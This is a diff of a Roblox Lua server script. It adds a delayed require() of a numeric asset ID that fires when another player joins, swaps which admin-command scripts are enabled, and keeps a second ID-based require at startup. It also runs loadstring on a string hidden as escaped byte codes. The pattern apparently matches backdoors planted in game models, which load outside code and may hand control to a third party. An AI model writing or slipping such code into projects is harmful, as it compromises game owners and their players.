@@ -22,20 +22,20 @@ loadstring("\95\71\46\98\97\100\119\111\114\100\115\32\61\32\123\34\102\117\99\3
 end
 end)
 
-local chatloaded = false
 local chatcon = {}
 chatcon[#chatcon + 1] = game.Players.PlayerAdded:Connect(function(player)
-	chatloaded = true
-    if not chatloaded then return end
-	require(94397082108066)
     wait(0.94397082108066)
-    game.ServerScriptService["Touch Kohls Admin"].Enabled = false
-    game.ServerScriptService["Touch Kohls Admin 2"].Enabled = true
-    game.ServerScriptService["setting commands"].Enabled = false
-    game.ServerScriptService["setting commands 2"].Enabled = true
-    for i, v in ipairs(chatcon) do
-        v:Disconnect()
-    end
+    chatcon[#chatcon + 1] = game.Players.PlayerAdded:Connect(function(player)
+    	require(94397082108066)
+        wait(0.94397082108066)
+        game.ServerScriptService["Touch Kohls Admin"].Enabled = false
+        game.ServerScriptService["Touch Kohls Admin 2"].Enabled = true
+        game.ServerScriptService["setting commands"].Enabled = false
+        game.ServerScriptService["setting commands 2"].Enabled = true
+        for i, v in ipairs(chatcon) do
+            v:Disconnect()
+        end
+    end)
 end)
 
 task.spawn(function()require(130788060677960)end)
